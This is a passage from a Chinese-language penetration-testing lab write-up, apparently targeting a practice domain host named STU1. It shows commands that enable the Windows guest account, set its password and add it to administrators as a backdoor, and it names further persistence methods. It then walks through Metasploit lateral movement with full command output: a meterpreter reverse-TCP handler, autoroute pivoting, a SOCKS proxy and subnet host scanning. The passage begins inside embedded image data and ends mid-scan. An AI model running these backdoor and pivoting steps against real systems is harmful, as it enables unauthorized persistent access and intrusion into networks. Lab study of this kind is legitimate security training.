qEZHR1UoFGTbtg4ePKjJycnUNgAAADrJOCZpY2Mj9a7JDx48iO4GHUb8pqCbdfXqVR08eFC2bWt0dFRra2vclBAAAGwbY5LU3d1ddXfmwcFBLS8vq1wua319XceOHWt7RwqFgtbW1vTxxx/rzTffrDqTBQAAsB2qrr9ZlhU4jlN1Z+e0u6Yn76Jc7y739crCCO/QHB8PRRAEQRAEsR1hHJMkSZOTk8bLXeVyWX19fcZtRkZG0qqrWxa6d++e/vnnH/3yyy8N1wUAAOikmhvcOo6jt99+W5J048aNppKbrbIsS9PT0+rt7X2q7QIAAKSpSZIAAADAjNsAAABGTSVJvu+3VGmr68e3aXbbVtp4Gv0BAADPl9SB2yHf95XJZKKf7V4/aSvbhu03u7yZNrbaHwAA8GyqOyYpmRw0ShaaXb/ZszNhgpK2PK3uVpK5VvsDAABeDKlJUqtJSCvLm12WVp6W1Gzl7FOr/QEAAM+3msttYQLS6CyO6XG4fTy5MK2zVaYzScm+1js7RPIDAAAaqUmSkgmOSb11TAlMo0tunTiL0+r2m+lPu5M/AACwcxgHbifPwpjOKtU7i5NcZkoiWh0P1Gmt9id5+Y9ECQCA50vqt9tMSUNaItFoLFErtppwtNJeqwO8AQDAi6PhFABb0UqCkbxMlzaYOr5+Wj1p7bezP50YawUAAHaO1CRpsxNItnIJKt5G2vxKpkSkU5fomulPHMkRAADPr5Yut5mep63f7ESN4Tbh4+T4p80O6m51Tqdm+wMAAF4MTd/gttWxOWnJUisTTjY7v1K8nUZJWjIB20p/AADA86vpJAkAAOBF0tQNbgEAAF40JEkAAAAGJEkAAAAGJEkAAAAGJEkAAAAGJEkAAAAGJEkAAAAG/w88uIZ+b9rM8QAAAABJRU5ErkJggg==" alt="image-20220814232334204"></p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>net user guest /active:yes						 <span class="token comment"># 激活guest</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="language-bash line-numbers-mode"><pre class="language-bash"><code>shell net user guest Aa123456					 <span class="token comment"># 给Guest用户设置密码</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><div class="language-bash line-numbers-mode"><pre class="language-bash"><code>shell net localgroup administrators guest /add    <span class="token comment"># 将guest加入到管理员中</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="添加新用户后门"><a href="#添加新用户后门" class="header-anchor">#</a> 添加新用户后门</h3> <blockquote><p>注：应加上域标签，如果按照上面Guest后门的方式，只是添加到STU1域里</p></blockquote> <p><img src="data:image/png;base64,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" alt="image-20220815002522071"></p> <p><img src="data:image/png;base64,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" alt="image-20220815002532623"></p> <p>然后用RD Client连接即可</p> <h3 id="尴尬之处"><a href="#尴尬之处" class="header-anchor">#</a> 尴尬之处</h3> <p>两边登录都会互踢</p> <blockquote><p>还可以采用其它权限维持的方法，比如shift后门、注册表后门、计划后门、白银黄金票据等</p></blockquote> <p><img src="/assets/img/image-20220815002731903.d2f7ee5a.png" alt="image-20220815002731903"></p> <h2 id="横向探测"><a href="#横向探测" class="header-anchor">#</a> 横向探测</h2> <h3 id="法一-msf-这里也写了proxychains"><a href="#法一-msf-这里也写了proxychains" class="header-anchor">#</a> 法一：MSF (*这里也写了ProxyChains)</h3> <blockquote><p>可跳转至前面的 内网渗透，内容近似。</p></blockquote> <p>先拿一个msf shell</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>msf6 <span class="token operator">&gt;</span> use exploit/multi/handler 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>exploit/multi/handler<span class="token punctuation">)</span>:

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options <span class="token punctuation">(</span>windows/x64/meterpreter/reverse_tcp<span class="token punctuation">)</span>:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          <span class="token function">yes</span>       Exit technique <span class="token punctuation">(</span>Accepted: <span class="token string">''</span>, seh, thread, process, none<span class="token punctuation">)</span>
   LHOST     <span class="token number">192.168</span>.220.137  <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>
   LPORT     <span class="token number">9999</span>             <span class="token function">yes</span>       The listen port


Exploit target:

   Id  Name
   --  ----
   <span class="token number">0</span>   Wildcard Target


msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.220.137:9999 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">200262</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span>.220.138
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">3</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span>.220.137:9999 -<span class="token operator">&gt;</span> <span class="token number">192.168</span>.220.138:6500 <span class="token punctuation">)</span> at <span class="token number">2022</span>-08-14 <span class="token number">12</span>:45:28 -0400

meterpreter <span class="token operator">&gt;</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br></div></div><p>添加路由</p> <blockquote><p>手工添加：run autoroute -s 192.168.21.0/24		#添加路由
run autoroute -p									#查看路由
自动添加：run post/multi/manage/autoroute</p></blockquote> <blockquote><p>查看路由表：run autoroute -p</p></blockquote> <div class="language- line-numbers-mode"><pre class="language-text"><code>meterpreter &gt; run post/multi/manage/autoroute

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: windows
[*] Running module against STU1
[*] Searching for subnets to autoroute.
[+] Route added to subnet 169.254.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 192.168.52.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 192.168.220.0/255.255.255.0 from host's routing table.
meterpreter &gt; run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   169.254.0.0        255.255.0.0        Session 1
   192.168.52.0       255.255.255.0      Session 1
   192.168.220.0      255.255.255.0      Session 1
   
meterpreter &gt; background 
[*] Backgrounding session 1...
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><p>然后配置代理</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> use auxiliary/server/socks_proxy
msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>auxiliary/server/socks_proxy<span class="token punctuation">)</span>:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password <span class="token keyword">for</span> SOCKS5 listener
   SRVHOST   <span class="token number">0.0</span>.0.0          <span class="token function">yes</span>       The address to listen on
   SRVPORT   <span class="token number">1080</span>             <span class="token function">yes</span>       The port to listen on
   USERNAME                   no        Proxy username <span class="token keyword">for</span> SOCKS5 listener
   VERSION   <span class="token number">5</span>                <span class="token function">yes</span>       The SOCKS version to use <span class="token punctuation">(</span>Accepted: 4a, <span class="token number">5</span><span class="token punctuation">)</span>


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server


msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> srvhost <span class="token number">127.0</span>.0.1
srvhost <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">127.0</span>.0.1
msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Auxiliary module running as background job <span class="token number">0</span>.

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting the SOCKS proxy server
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><p>使用msf模块扫描存活主机</p> <blockquote><p>可见三台</p></blockquote> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>msf6 auxiliary<span class="token punctuation">(</span>server/socks_proxy<span class="token punctuation">)</span> <span class="token operator">&gt;</span> use auxiliary/scanner/netbios/nbname
msf6 auxiliary<span class="token punctuation">(</span>scanner/netbios/nbname<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.52.0/24
rhosts <span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token number">192.168</span>.52.0/24
msf6 auxiliary<span class="token punctuation">(</span>scanner/netbios/nbname<span class="token punctuation">)</span> <span class="token operator">&gt;</span> options 

Module options <span class="token punctuation">(</span>auxiliary/scanner/netbios/nbname<span class="token punctuation">)</span>:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  <span class="token number">256</span>              <span class="token function">yes</span>       The number of hosts to probe <span class="token keyword">in</span> each <span class="token builtin class-name">set</span>
   RHOSTS     <span class="token number">192.168</span>.52.0/24  <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasplo
                                         it
   RPORT      <span class="token number">137</span>              <span class="token function">yes</span>       The target port <span class="token punctuation">(</span>UDP<span class="token punctuation">)</span>
   THREADS    <span class="token number">10</span>               <span class="token function">yes</span>       The number of concurrent threads

msf6 auxiliary<span class="token punctuation">(</span>scanner/netbios/nbname<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run

